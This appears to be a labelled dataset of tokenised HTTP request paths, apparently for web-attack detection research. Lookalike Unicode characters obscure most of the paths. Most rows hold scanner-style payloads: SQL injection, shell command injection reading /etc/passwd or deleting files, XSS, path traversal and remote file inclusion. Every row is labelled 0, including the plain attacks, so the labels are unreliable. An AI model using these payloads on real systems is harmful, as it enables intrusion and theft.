sentences 	 labels
/ 𝕤𝑡ring / strings / parameters = 1 '  where 1623 = 1623 ; select  ( case when  ( 4393 = 2875 )  then 1 else 4393 *  ( select 4393 from master .  . sysdatabases )  end )  --  	 0
/ 𝒔𝑡ring / strings / parameters = $  { passthru ( print (  ` echo pyelub ; echo  $  (  ( 29 + 64 )  )  ; echo pyelub ; echo pyelub `  )  ;  # pyelub  	 0
/ 𝙨𝙩ring / strings / parameters = 1 '  and make_set ( 8403 = 8403 , 8899 )  and  ' lnwe '  =  ' lnwe  	 0
/  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \ boot . ini  	 0
/ 𝐬𝗍ring / str =  $  ( echo yqabcf )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 0
/ m𝖺іn . php ? logout =  "  | ping -w 11000 -n 1 1 . 2 . 3 . 4 | rem  	 0
/ ꜱ𝐭ring / strings / parameters = < var onmouseover =  " prompt ( 1 )  "  > on mouse over <  / var >  ?  	 0
/ 𑣁𝔱ring / id = 1 & nombre = queso + manchego & precio = 100 /  & cantidad = 15 & b1 = aadir + al + carrito  	 0
/ ℯ𝓍amples / jsp / jsp2 / jspx / index . php ? search =  < script > foo <  / script >  	 0
/ 𝒔𝚝ring / strings / parameters = 1 '  in boolean mode )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  #  	 0
/ ƽ𝒕ring / modo = entrar & login = hedrich & pwd = chonta & remember =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & b1 = entrar  	 0
/ 𝗌𝙩ring / strings / parameters = "  &  & echo eiucdv $  (  ( 83 + 99 )  )  $  ( echo eiucdv ) eiucdv "  	 0
/  < script > document . cookie =  " testziyq = 5055 ;  "  <  / script >  	 0
/ 𝗉𝘣server /  .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  	 0
/ ℮𝘹amples / jsp / cal / topic . php ? tid =  ' select  	 0
/ ρ𝐡pmyadmin / index . php ? page =  / etc / passwd \ x00  	 0
/ jꝚk𝕕mfw4 . nsf ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝑠𝓽ring / modo = registro & login = boudin & password = interpretacin & nombre = alcibades & apellidos = ferrandi + moja & email = leistiko @ soymadrileo . je & dni = 21274501f & direccion = travesia + travesia + 1 + isaac + peral ,  + s / n +  & ciudad = ivor *  * ra & cp = 09091 & provincia = segovia & ntc = 2482906400759424 & b1 = registrar  	 0
/ 𐑈𝒕ring / strings / parameters = 1 %  '  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) gcrr )  #  	 0
/ ỿ𝖉exw8by . php3 ?  < script > document . cookie =  " testulex = 4996 ;  "  <  / script >  	 0
/ 𐑈𝒕ring / strings / parameters = 1 )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5  	 0
/ 𝓈𝗁op / index . php ? action = xxpathxx ?  & cmd = cat config . php  	 0
/ 𝖘𝓉ring / strings / parameters = '   str =  $  ( echo roezhe )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 0
/ 𝚊𝓹58k3ci . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝔰𝘵ring / strings / parameters = |   [  1 -ne  $  ( echo pefrrd  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 0
/ 𝓼𝓽ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ogqlys )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 0
/ 𝔰𝒕ring / strings / parameters = 1 %  "  "  )  )  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  (  (  "  "  %  "  "  =  "  "  	 0
/ 𝑠𝚝ring / strings / parameters = < script src =  " data :  \ xe0 \ xa4 \ x98 , javascript : alert ( 1 )  "  >  <  / script >  	 0
/ 𝑠𝓽ring / strings / parameters = "  & echo xpabsl $  (  ( 91 + 48 )  )  $  ( echo xpabsl ) xpabsl  	 0
/ 𝗌𝑡ring / strings / parameters = )  ;  } print (  ` echo scgphn echo  $  (  ( 41 + 99 )  )  echo scgphn echo scgphn `  )  ;  )  } scgphn  	 0
/ 𝘴𝐜ripts / index . php ? search =  < script > foo <  / script >  	 0
/ 𝔰𝕥ring / strings / parameters = 1 and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  	 0
/ 𝗰𝘨i-bin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 419495929 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 0
/ 𝔱Ꮒemes / container . php ? theme_directory = xxpathxx 	 0
/ 𑜏o𝗋dpress_files / all_users / wp-content / plugins / enigma2 . php ? boarddir = xxpathxx ?  	 0
/ 𝙨𝓽ring / strings / parameters = '  |   [  6 -ne  $  ( echo ygaawq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 0
/ 𝓮𝙜aet53a . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝖘𝓽ring / strings / parameters = '   str =  $  ( echo karbcx )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 0
/ 𝓈𝙩ring / strings / parameters = or 1  --  '  	 0
/ 𝐭o𝕡 . php ? stuff =  " ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  	 0
/ 𝒔𝕔ripts / admin / plog-admin-functions . php ? config [ basedir ]  =  / etc / passwd \ x00  	 0
/ ꜱ𝗍ring / strings / parameters = 1 %  "  "  )  )  )  and  ( 3502 = 7893 )  * 7893 and  (  (  (  "  "  %  "  "  =  "  "  	 0
/ аn𝕥ispam / listdel ? file = blacklist & name = b < script > alert (  ' vulnerable '  )  <  / script >  & startline = 0  	 0
/ 𝗊𝔟2xy9aw . php ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ѕ𝘵ring / modo = registro & login = ploof & password = p04u803 & nombre = alenda & apellidos = pruneda + de + velasco & email = caron @ nexuspark . ai & dni = 85853074bp & direccion = carretera + lebrija ,  + 25 +  & ciudad = santo + tom + del + puerto & cp = 42126 & provincia = cceres & ntc = 7582936564650481 & b1 = registrar  	 0
/ 𝗵𝖊lp . php ? q = ver \ x09 > q41751651 & rem \ x09  	 0
/ 𝔢𝑥amples / jsp / jsp2 / el / www / delivery / ac . php ? bannerid = -1331904368 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_2tgmms8c ]  )  )  ; die ;  /  *  	 0
/ j𝔞𝖛ascript / pubs . exe  	 0
/ m𝔞𝒾n . php ? logout =  '  ; uname \ x09 > q35732238 \ x09 #  	 0
/ 𝘢𝖽min / admin_news_bot . php ? root_path = xxpathxx ?  	 0
/ ѕ𝒕ring / strings / parameters = |  | echo $ ifsiwafla $  (  ( 17 + 83 )  )  $  ( echo $ ifsiwafla ) iwafla /  /  	 0
/ 𝗲𝓍amples / jsp / jsp2 / jspx / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini  	 0
/ ѕ𝙩ring / strings / parameters = '  ;  str =  $  ( echo qukucg )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 0
/  < meta http-equiv = set-cookie content =  " testftxz = 5980 "  >  	 0
/ ҽ𝗑amples / jsp / error / ncbook / ncbook . cgi ? action = default & current =  | cat  / etc / passwd |  & form_tid = 996604045 & prev = main . html & list_message_index = 10  	 0
/ 𝐜𝕘i-bin / emumail / emumail . cgi ? type =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ ҽ𝐱amples / jsp / error / index . php ? act = arcade & do = stats & gameid = 1 '  	 0
/ 𝐡ҽlp . php ? q =  "  & ver ;  > q11575615 & rem ;  	 0
/ mαᎥn . php ? stuff =  & ver ,  > q61913742 & rem ,  	 0
/ 𝓱𝚝8pn8uq . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝔵lj𑣆h65o . idc ?  < script > document . cookie =  " testtbbe = 856 ;  "  <  / script >  	 0
/ 𝘴𝖼ripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908785 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  	 0
/ ƽ𝕥ring / modo = registro & login = kacy & password = en4ocar & nombre = policarpo & apellidosa = stucchi & email = weismuller @ e-b-s . kr & dni = 77550396p & direccion = avinguda + biscaia ,  + 98 + 13-g & ciudad = villares + del + saz & cp = 05514 & provincia = segovia & ntc = 9931554844705461 & b1 = registrar  	 0
/ 𝑠𝐭ring / strings / parameters = |   [  4 -ne  $  ( echo vazljc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 0
/ 𝕤𝔱ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hvspqm )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 0
/ 𝓈𝑡ring / strings / parameters = 1 '  )  )  )  waitfor delay  ' 0 : 0 : 5 '  and  (  (  (  ' clcf '  =  ' clcf  	 0
/ 𝑠𝕥ring / strings / parameters = "  ;  str =  $  ( echo upzcij )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 0
/ 𝚜𝘵ring / strings / parameters = echo qfcalq $  (  ( 19 + 0 )  )  $  ( echo qfcalq ) qfcalq '  	 0
/ ѕ𝚝ring / strings / parameters = 1 %  '  )  )  )  ; waitfor delay  ' 0 : 0 : 5 '  --  	 0
/ n𝚢Ib3qq4 . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝗲𝕩amples / jsp / jsp2 / jspx / index . php ? include_files [  ]  =  & include_files [ query_string ]  =  / etc / passwd  	 0
/ 𝓼сs86g1p . cfc ?  < script > document . cookie =  " testquyx = 2820 ;  "  <  / script >  	 0
/ 𝔰𝑡ring / strings / parameters = "  & echo jkzwso $  (  ( 16 + 99 )  )  $  ( echo jkzwso ) jkzwso |  	 0
/ 𝕖n-𝖚s / i686v90l . dll ?  < meta http-equiv = set-cookie content =  " testfutf = 1550 "  >  	 0
/ ѕ𝚝ring / strings / parameters = | echo dpzhut $  (  ( 28 + 81 )  )  $  ( echo dpzhut ) dpzhut |  	 0
/ m𝒂𝙞n . php ? stuff =  '  & rm \ x09q84519525 \ x09 #  	 0
/ 𝘀𝓽ring / strings / parameters = "   str =  $  ( echo vycnrp )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 0
/ 𝗲n-𝕦s / account / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1647791366 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 0
/ 𝒔𝖙ring / strings / parameters = ) print (  ` echo ggcmzv `  .  ` echo  $  (  ( 6 + 53 )  )  `  .  ` echo ggcmzv `  .  ` echo ggcmzv `  )  )  } ggcmzv  	 0
/ 𝚜𝒄ripts / themes / program / themesettings . inc . php ? themesdir =  / etc / passwd \ x00  	 0
/ 𝑐𝖌i-bin / index . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1331905123 '  , null , null , null , null  --  	 0
/ 𝘴𝔱ring / strings / parameters = 1 '  where 9242 = 9242 ; begin dbms_lock . sleep ( 5 )  ;  end --  	 0
/ 𝚢ɯaxntrx . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝗌𝒕ring / modo = registro & login = perceval & passworda = tin86 & nombre = parmenio & apellidos = d ' molino + bocas & email = jay @ almascanarias . wf & dni = 96398598d & direccion = lepant + 33 ,  +  & ciudad = benuza & cp = 26560 & provincia = guadalajara & ntc = 2171179152751946 & b1 = registrar  	 0
/ 𐑈𝐭ring / strings / parameters = < img \ x10src = x onerror =  " javascript : alert ( 1 )  "  >  	 0
/ 𝒸𝑔i-sys / ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝕤𝗍ring / modo = registro & login = gallard & password = c36ba & nombre = federica & apellidos = romaguera + po , c * h & email = pankin @ muevetuweb . mobi & dni = 49680817n & direccion = calle + zapateria + vieja + 71 + 8d & ciudad = romanillos + de + atienza & cp = 03579 & provincia = tarragona & ntc = 2469234767327968 & b1 = registrar  	 0
/ ℎ𝕖lp . php ? q =  '  \ x0adel \ x09q87897781 \ x09 #  	 0
/  .  .  \  .  .  \  \  .  .  \  .  .  \  \  .  .  \  .  .  \  \  .  .  \  .  .  \  \  \  { file }  	 0
/ 𝟣𝟞9okeyj . mscgi ?  < script > document . cookie =  " testxeoi = 3573 ;  "  <  / script >  	 0
/ 𝐬𝈒qus4g3 . pl ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ѕ𝖙ring / strings / parameters = <  !  --  < img src =  "  --  >  < img src = x onerror = alert ( 123 )  /  /  "  >  	 0
/ j🯲k𝙙mfw4 . jsp ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝖾𝙭amples / jsp / cal / nucleus / libs / pluginadmin . php ? globals [ dir_libs ]  =  / etc / passwd \ x00  	 0
/ m𝖆n𝒶ger / index . php ? module =  < script > foo <  / script >  	 0
/ 𝘦𝓍amples / jsp / cal / whois . cgi ? action = load & whois =  ; id  	 0
/ 𝐭o𝘱 . php ? stuff =  " ver & rem ,  	 0
/ 𝘴𝘁ring / modo = insertar & precio = 8792 & b1 = pasar + por + cajaany set-cookie :  + tamper = 1041264011025374727  	 0
/ ꜱ𝒕ring / strings / parameters = -7610 '  or 3038 = 3038  	 0
/ ⅈn𝙘ludes / adodb / back / adodb-postgres7 . inc . php ? adodb_dir = xxpathxx ?  	 0
/ ѕ𝐭ring / modo = entrar & login = jeavons6 & pwd = empapuciar & remember = off & b1 = entrar '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 0
/ 𑣁𝓽ring / strings / parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null )   /  *  	 0
/ ꜱ𝕥ring / id = 2 & nombre = vino + rioja & precio =  < script > alert (  " paros "  )  ;  <  / script >  & cantidad = 26 & b1 = aadir + al + carrito  	 0
/ 𝑏𝓬wb_path / system / default . css . php ? root_path_admin = xxpathxx  	 0
/ 𝓮𝙭amples / jsp / jsp2 / el / docs / index . php ? lang =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝖘𝖼ripts / starnet / addons / slideshow_full . php ? album_name =  ' 1283310915  	 0
/ 𝕙𝕖lp . php ? q =  '  \ x0auname \ x09 > q61575727 \ x09 #  	 0
/  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  { file }  	 0
/ 𝖘𝗍ring / strings / parameters = 1 %  "  "  ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual and  "  "  %  "  "  =  "  "  	 0
/ ѕ𝕒blonlar / gunaysoft / gunaysoft . php ? icerikyolu = xxpathxx  	 0
/ 𝐬𝒕ring / strings / parameters = '  & echo synxtk $  (  ( 0 + 99 )  )  $  ( echo synxtk ) synxtk |  	 0
/ m𝘢n𝒶ger / phf ? qalias = x \ x0a / bin / cat  / etc / passwd  	 0
/ 𑣁𝓽ring / strings / parameters = 1 "  "  and  ( 7424 = 2381 )  * 2381 and  "  " dvju "  "  =  "  " dvju  	 0
/ 𑣁𝚝ring / strings / parameters = 1 "  "  )  )  as wfne where 8933 = 8933 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  --  	 0
/ 𝒔𝗍ring / strings / parameters = ;  str =  $  ( echo ojgbkf )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 0
/ 𝐭𑣊af3tdz . htm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ o𝑝℮nsiteadmin / scripts / classes / databasemanager . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / frznctvhi0i5 ?  \ x00  	 0
/ 𝐬𝓉ring / strings / parameters = '  |   [  7 -ne  $  ( echo pspape  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 0
/ 𝓼𝗍ring / strings / parameters = ;  str =  $  ( echo knetda )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  	 0
/ 𝓼𝓉ring / strings / parameters = -8655 )  where 3910 = 3910 union all select 3910 , 3910 #  	 0
/ 𝑠𝓽ring / strings / parameters = 1 '  where 5035 = 5035 and 8594 =  ( select 8594 from pg_sleep ( 5 )  )  --  	 0
/ 𝚜𝐭ring / strings / parameters = 1 %  "  "  )  )  and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  "  "  %  "  "  =  "  "  	 0
/ j𝐚𝓋ascript / poll . exe  	 0
/ 𝑠𝗍ring / strings / parameters = -1162 "  "  )  )  as mhmh where 8710 = 8710 or make_set ( 4822 = 7598 , 7598 )  --  	 0
/ m𝓪ɩn . php ? logout =  "  \ x0arm \ x09q98198938 \ x09 #  	 0
/ m𝒂𝚒n . php ? stuff =  "  & del \ x09q54676593 \ x09 #  	 0
/ 𝕤𝔱ring / strings / parameters = -6097 %  '  )  )  union all select 3990 , 3990 , 3990 , 3990 , 3990 , 3990 --  	 0
/ 𝓮𝓍amples / jsp / error / misc / audio . php ? recording =  .  .  / version . inc  	 0
/ ⅰn𝓬ludes / functions . php ? phpbb_root_path = xxpathxx  	 0
/ 𝗌𝙩ring / strings / parameters = < img src =  " jav	ascript : confirm ( document . location )  ;  "  >  	 0
/ ×𝖋kun1ku . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝑠𝘵ring / strings / parameters = '  & echo $ ifsdvjeek $  (  ( 20 + 0 )  )  $  ( echo $ ifsdvjeek ) dvjeek  	 0
/ 𝐬𝘁ring / strings / parameters = echo wgoisg $  (  ( 75 + 94 )  )  $  ( echo wgoisg ) wgoisg \  	 0
/ һ𝖊lp . php ? q =  "  & del \ x0cq17127645 & rem \ x0c  	 0
/ 𝚜𝚝ring / modo = insertar & precio = 41 & b1 = confirmar /  	 0
/ 𝒆𝙭amples / jsp / error / apa_phpinclude . inc . php ? apa_module_basedir =  / etc / passwd \ x00  	 0
/ 🯷𝑑bjwpw6 . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ꬲn-ꞟs / account / athenareg . php ? pass =   ; id  	 0
/ m𝒶𝙞n . php ? stuff =  "  \ x0auname \ x09 > q72429699 \ x09 #  	 0
/ 𝗌𝕥ring / strings / parameters = '  |  | echo $ ifsoqcuyn $  (  ( 22 + 3 )  )  $  ( echo $ ifsoqcuyn ) oqcuyn /  /  	 0
/ 𝐬𝑡ring / strings / parameters = < img src =  "  " blah "  " onmouseover =  "  " document . cookie = true ;  "  "  >  	 0
/ j𝕒𝑣ascript / hire . exe  	 0
/ 𝐡𝖊lp . php ? q =  " ping \ x0c-w \ x0c11000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 & rem \ x0c  	 0
/ 𝕤𝒕ring / strings / parameters = ;  str =  $  ( echo otxvur )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 0
/ 𝔰𝘁ring / strings / parameters = -2504 '  )  )  )  or 8723 = 9715  	 0
/ 𝒑𝒽pmyadmin / top . php ? header =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝕤𝑡ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo bkaifj )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 0
/ 𝖾𝒙amples / jsp / cal / common / visiteurs / include / menus . inc . php ? lvc_include_dir =  / etc / passwd \ x00  	 0
/ 𝐬𝚌ripts / starnet / addons / slideshow_full . php ? album_name =  ' 836532164  	 0
/ ρꭵranha / secure / passwd . php3  	 0
/ 𝚒𝟕prbs22 . pl ?  < meta http-equiv = set-cookie content =  " testjnre = 7328 "  >  	 0
/ 𝐩l𝙪gins / backup / archive / predicate . php ? bkpwp_plugin_path = xxpathxx ?  	 0
/ 𝖘𝗍ring / strings / parameters = "   str =  $  ( echo rowalz )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 0
/ 𝙚n-𝖚s / account / a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝔢×amples / jsp / num / lib / dbman_filter . inc . php ? lib_path =  / etc / passwd \ x00  	 0
/ 𝑐𝗀i-bin / shopplus . cgi ? dn = domainnikto . com & cartid =  \ xcartid %  & file =  ; cat  / etc / passwd |  	 0
/ 𝗲×amples / jsp / jsp2 / jspx / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f  	 0
/ 𝖾n-𝓊s / manager / launcher / apps / local ? msgid = 149680 . 846943106001 & amp ; ns = launcher & amp ; redirecting = true  	 0
/ ѕ𝚝ring / strings / parameters =  	 0
/ 𝚜𝓉ring / strings / parameters = 1 "  "  or  ( select 9173 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9173 = 9173 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  "  " bkrk "  "  =  "  " bkrk  	 0
